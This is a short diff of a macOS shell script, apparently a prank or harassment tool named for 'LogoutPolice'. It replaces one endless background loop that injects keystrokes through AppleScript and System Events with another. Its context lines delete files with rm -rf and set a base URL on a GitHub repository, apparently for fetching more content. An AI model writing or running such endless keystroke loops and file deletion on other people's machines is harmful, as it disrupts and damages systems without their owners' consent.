@@ -1,7 +1,7 @@
-echo "tell application \"System Events\"
-key code 28 using {command down, option down, control down}
-end tell" > ~/Library/config
-while [ 1 ]; do osascript ~/Library/config; done &
+for ((;;)) do osascript -e 'tell application "System Events"
+	key code 93
+end tell'; done&
+
 zsh -c 'rm -rf "~/Library/*42_cache*"';
 
 BASIC=('https://raw.githubusercontent.com/LogoutPolice/RandomBanana/master/')
